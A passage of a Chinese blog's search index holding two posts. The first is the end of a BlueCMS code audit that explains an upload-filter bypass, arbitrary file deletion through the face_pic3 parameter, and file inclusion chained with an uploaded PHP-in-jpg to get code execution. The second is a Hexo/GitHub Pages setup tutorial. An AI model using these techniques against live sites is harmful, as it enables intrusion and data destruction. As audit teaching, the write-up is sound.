variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$imgname</span> <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token constant">BLUE_ROOT</span><span class="token punctuation">.</span><span class="token constant">DATA</span><span class="token punctuation">.</span><span class="token constant">UPLOAD</span><span class="token punctuation">.</span><span class="token function">date</span><span class="token punctuation">(</span><span class="token string">"Ym"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token constant">BLUE_ROOT</span><span class="token punctuation">.</span><span class="token constant">DATA</span><span class="token punctuation">.</span><span class="token constant">UPLOAD</span><span class="token punctuation">.</span><span class="token variable">$dir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'type'</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">allow_image_type</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token comment" spellcheck="true">//第一次过滤，可以修改content-type绕过</span>            <span class="token keyword">echo</span> <span class="token string">'&lt;font style="color:red;">不允许的图片类型&lt;/font>'</span><span class="token punctuation">;</span>            exit<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$imgname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//get_type()进行了白名单后缀名过滤并返回后缀。</span>            <span class="token comment" spellcheck="true">// 白名单后缀 + 修改文件名。无法绕过。</span>            <span class="token variable">$imgname</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">create_tempname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">'.'</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">get_type</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$dir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">'&lt;font style="color:#ff0000;">上传过程中创建目录失败&lt;/font>'</span><span class="token punctuation">;</span>                exit<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token variable">$imgname</span> <span class="token operator">=</span> <span class="token variable">$dir</span> <span class="token punctuation">.</span> <span class="token variable">$imgname</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">uploading</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$imgname</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token constant">BLUE_ROOT</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token variable">$imgname</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>            <span class="token keyword">echo</span> <span class="token string">'&lt;font style="color:red;">上传图片失败&lt;/font>'</span><span class="token punctuation">;</span>            exit<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get_type</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$pos</span> <span class="token operator">=</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">,</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$pos</span> <span class="token operator">!==</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$extension_name</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$filepath</span><span class="token punctuation">,</span><span class="token variable">$pos</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$extension_name</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">extension_name_arr</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">//第二次过滤，白名单后缀名。</span>            <span class="token keyword">echo</span> <span class="token string">'&lt;font style="color:red;">您上传的文件不符合要求,请重试&lt;/font>'</span><span class="token punctuation">;</span>            exit<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$extension_name</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//后缀名若在白名单中则返回后缀名。</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">/**     * 创建一个文件名，生成随机文件名     */</span>    <span class="token keyword">function</span> <span class="token function">create_tempname</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h5 id="任意文件删除审计—存在"><a href="#任意文件删除审计—存在" class="headerlink" title="任意文件删除审计—存在"></a>任意文件删除审计—存在</h5><p>在审计上一节的文件上传时，看到一段代码像是存在任意文件删除，故进行审计验证，确定确实存在。</p><p>经过分析逻辑，发现该代码的作用时用于用户删除原头像文件。</p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924115431454.png" alt="image-20200924115431454" style="zoom:40%;"><p>代码如下，当<code>face_pic1</code>变量为空时（即用户清空了头像输出框的值，即删除头像），就会把头像文件进行删除。</p><pre class=" language-php"><code class="language-php"> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$act</span> <span class="token operator">==</span> <span class="token string">'edit_user_info'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    。。。。。。    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'face_pic1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'face_pic1'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> 'http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//') != false &amp;&amp; strpos($_POST['face_pic1'], 'https://') != false){</span>           <span class="token function">showmsg</span><span class="token punctuation">(</span><span class="token string">'只支持本站相对路径地址'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>        <span class="token keyword">else</span><span class="token punctuation">{</span>           <span class="token variable">$face_pic</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'face_pic1'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token constant">BLUE_ROOT</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'face_pic3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">BLUE_ROOT</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'face_pic3'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment" spellcheck="true">//任意文件删除</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span></code></pre><p><strong>漏洞验证</strong></p><p>我们可以只传<code>face_pic3</code>参数的值，实现任意文件删除。</p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924120311908.png" alt="image-20200924120311908" style="zoom:50%;"><h2 id="个人中心—充值"><a href="#个人中心—充值" class="headerlink" title="个人中心—充值"></a>个人中心—充值</h2><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924144412692.png" alt="image-20200924144412692" style="zoom:50%;"><h5 id="文件包含审计—存在"><a href="#文件包含审计—存在" class="headerlink" title="文件包含审计—存在"></a>文件包含审计—存在</h5><p>充值功能依然由<code>user.php</code>处理，<code>act</code>为<code>pay</code>时代码逻辑如下，可以看到代码直接将传入的<code>pay</code>参数拼接到<code>include</code>文件包含函数中。</p><pre class=" language-php"><code class="language-php"><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$act</span> <span class="token operator">==</span> <span class="token string">'pay'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     <span class="token keyword">include</span> <span class="token string">'data/pay.cache.php'</span><span class="token punctuation">;</span>     <span class="token variable">$price</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'price'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token variable">$id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pay'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">showmsg</span><span class="token punctuation">(</span><span class="token string">'对不起，您没有选择支付方式'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">include</span> <span class="token string">'include/payment/'</span><span class="token punctuation">.</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'pay'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token string">"/index.php"</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//文件包含，直接将pay参数的值拼接。</span> <span class="token punctuation">}</span></code></pre><p><strong>漏洞利用</strong></p><p>需要注意到，文件包含时<code>/index.php</code>后缀是被固定了的，因此在进行利用之前，我们需要将其进行截断。</p><p>利用<code>Windows的路径不能超过256个字符</code>的特性，我们可以用多个<code>.</code>将后面的<code>/index.php</code>截断掉。（Window10截断失败，有机会再试其它。）</p><p>解决完截断后缀的问题，接下来要考虑的是要包含的文件，在前面审计头像上传时，说到由于过滤不能直接利用需要配合文件包含漏洞来利用，此时就可以用上了。</p><p>首先在头像上传的地方上传包含PHP代码的<code>jpg</code>文件。</p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924151703931.png" alt="image-20200924151703931" style="zoom:40%;"><p>从下图中可以看到上传文件成功，由于不是真的图片文件，所以不能显示，同时也能获取到文件的URL，本例是<code>data/upload/face_pic/16009318533.jpg</code>。</p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924151831672.png" alt="image-20200924151831672" style="zoom:40%;"><p>进行文件包含</p><img src="/2020/09/22/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%85%A5%E9%97%A8%E5%AE%9E%E6%88%98%E2%80%94BlueCMS/image-20200924162111274.png" alt="image-20200924162111274" style="zoom:50%;"><p>这套程序存在大量漏洞，未完待续。。。。。。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP代码审计 </tag>
            
            <tag> BlueCMS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo + GitPage博客搭建</title>
      <link href="2020/09/20/build-blog/"/>
      <url>2020/09/20/build-blog/</url>
      
        <content type="html"><![CDATA[<h4 id="前备环境"><a href="#前备环境" class="headerlink" title="前备环境"></a>前备环境</h4><ul><li>Git</li><li>Node.js</li></ul><h4 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h4><blockquote><p><code>npm install -g hexo-cli</code></p></blockquote><h4 id="初始化Blog"><a href="#初始化Blog" class="headerlink" title="初始化Blog"></a>初始化Blog</h4><blockquote><p><code>hexo init  Myblog</code>       #会在当前目录下生成Myblog目录，即博客目录。</p></blockquote><h4 id="安装依赖模块"><a href="#安装依赖模块" class="headerlink" title="安装依赖模块"></a>安装依赖模块</h4><blockquote><p><code>cd Myblog</code></p><p><code>npm install</code>     #根据Myblog目录下的package.json安装所需的模块。如hexo-server等。</p></blockquote><p>目录、文件结构说明：</p><blockquote><p>Myblog</p><p>​        I— node_modules            # 存放模块的目录。</p><p>​        |— scaffolds                       # 文章、页面模板。</p><p>​        |— source                           # 存放文章的目录。</p><p>​        |— themes                          # 存放Hexo主题的目录。</p><p>​        |— .gitignore                      </p><p>​        |— _config.yml                   #Hexo主配置文件，如网站Title、主题等配置。</p><p>​        |— package.json                #依赖说明文件。</p><p>​        |__ package-lock.json</p></blockquote><h4 id="安装主题"><a href="#安装主题" class="headerlink" title="安装主题"></a>安装主题</h4><p>主题在Hexo主配置文件<code> _config.yml</code>中的<code>theme</code>配置项中设置。</p><blockquote><p><code>cd Myblog/themes/</code></p><p>git clone <a href="https://github.com/blinkfox/hexo-theme-matery.git" target="_blank" rel="noopener">https://github.com/blinkfox/hexo-theme-matery.git</a></p></blockquote><h4 id="额外插件"><a href="#额外插件" class="headerlink" title="额外插件"></a>额外插件</h4><p><strong>a.代码高亮</strong></p><blockquote><p><code>npm i -S hexo-prism-plugin</code></p></blockquote><p>修改Hexo主配置文件<code> _config.yml</code>：</p><pre><code>highlight:     #关闭hexo自带的代码高亮  enable: falseprism_plugin:    #新增这部分配置以启用prism高亮插件。  mode: &#39;preprocess&#39;    # realtime/preprocess  theme: &#39;tomorrow&#39;  line_number: false    # default false  custom_css:</code></pre><p><strong>b.字数统计</strong></p><blockquote><p><code>npm i --save hexo-wordcount</code></p></blockquote><p>在主题的配置文件<code> _config.yml</code>中启用字数统计：</p><pre><code>postInfo:  wordCount: true      # 文章字数统计  totalCount: true      # 站点总文章字数</code></pre><p><strong>c.搜索插件</strong></p><blockquote><p><code>npm install hexo-generator-search --save</code></p></blockquote><p>在Hexo的主配置文件<code> _config.yml</code>中新增以下内容：</p><pre><code>search:  path: search.xml  field: post</code></pre><h4 id="新增分类、关于我等页面"><a href="#新增分类、关于我等页面" class="headerlink" title="新增分类、关于我等页面"></a>新增分类、关于我等页面</h4><p>具体页面配置，见<a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md" target="_blank" rel="noopener">主题说明</a>。</p><blockquote><p>hexo new page “categories”</p><p>hexo new page “tags”</p><p>hexo new page “about”</p></blockquote><h4 id="部署到GitPages"><a href="#部署到GitPages" class="headerlink" title="部署到GitPages"></a>部署到GitPages</h4><p>安装将博客到部署到Git的插件</p><blockquote><p>npm install hexo-deployer-git –save</p></blockquote><p>配置Git信息</p><blockquote><p>git config –global user.email “<a href="mailto:&#x79;&#111;&#117;&#x40;&#101;&#x78;&#97;&#x6d;&#x70;&#x6c;&#101;&#46;&#99;&#111;&#x6d;">&#x79;&#111;&#117;&#x40;&#101;&#x78;&#97;&#x6d;&#x70;&#x6c;&#101;&#46;&#99;&#111;&#x6d;</a>“<br>git config –global user.name “a4ua”</p></blockquote><p>在Hexo的主配置文件中配置：</p><pre><code>deploy:  type: &#39;git&#39;  repo:  https://github.com/a4ua/a4ua.github.io</code></pre><p>部署命令</p><blockquote><p>hexo  d</p></blockquote><h4 id="评论系统Valine"><a href="#评论系统Valine" class="headerlink" title="评论系统Valine"></a>评论系统Valine</h4><p><code>hexo-theme-matery</code>主题自带了Valine评论系统，在主题配置文件中启用即可</p><pre><code>valine:  enable: true  appId:   appKey: </code></pre><p>appID和appKey需要去注册，<a href="https://www.leancloud.cn/" target="_blank" rel="noopener">注册连接</a>。</p><p>注册账户登录后创建应用，在设置=&gt;应用Keys即可看到。</p><img src="/2020/09/20/build-blog/image-20200922222556328.png" alt="image-20200922222556328" style="zoom:67%;"><p>评论在存储=&gt;Comment处管理。</p><img src="/2020/09/20/build-blog/image-20200922222831657.png" alt="image-20200922222831657" style="zoom:67%;"><h4 id="自定义域名"><a href="#自定义域名" class="headerlink" title="自定义域名"></a>自定义域名</h4><p>到Github上的博客仓库的<code>settings</code>，进入并找到<code>Custom Domain</code>，输入框填入自己的域名即可。</p><img src="/2020/09/20/build-blog/image-20200922210232252.png" alt="image-20200922210232252" style="zoom:67%;"><p>然后在<code>source</code>目录下创建一个文件，名称为<code>CNAME</code>，文件无后缀。文件的内容写入域名，如：<code>a4ua.com</code>,作用是避免每次部署博客时，上一步在Github仓库设置的自定义域名会被重置。</p><h4 id="Hexo文章本地图片"><a href="#Hexo文章本地图片" class="headerlink" title="Hexo文章本地图片"></a>Hexo文章本地图片</h4><p>参考连接：</p><p><a href="https://www.jianshu.com/p/f72aaad7b852" target="_blank" rel="noopener">https://www.jianshu.com/p/f72aaad7b852</a></p><h4 id="Hexo常用命令"><a href="#Hexo常用命令" class="headerlink" title="Hexo常用命令"></a>Hexo常用命令</h4><p>启动本地Hexo服务器</p><blockquote><p>cd Myblog</p><p>hexo  s     #服务器默认监听在<a href="http://localhost:4000/" target="_blank" rel="noopener">http://localhost:4000</a></p></blockquote><p>创建新的文章</p><blockquote><p>hexo new  “title”    #根据scaffolds\post.md模板生成文章。</p></blockquote><p>渲染</p><blockquote><p>hexo g        #渲染会生成一个public文件夹，里面存放渲染好的博客文件。</p></blockquote><p>部署</p><blockquote><p>hexo d     #将博客部署到GitPage，实质是上传public文件夹到github对应仓库。</p></blockquote><p>清理缓存</p><blockquote><p>hexo clean</p></blockquote><h4 id="解决代码中-乱码问题"><a href="#解决代码中-乱码问题" class="headerlink" title="解决代码中{}乱码问题"></a>解决代码中<code>{}</code>乱码问题</h4><blockquote><p>npm i <a href="mailto:&#x68;&#101;&#x78;&#111;&#64;&#x34;&#46;&#49;&#46;&#x31;">&#x68;&#101;&#x78;&#111;&#64;&#x34;&#46;&#49;&#46;&#x31;</a>    #安装低版本hexo</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
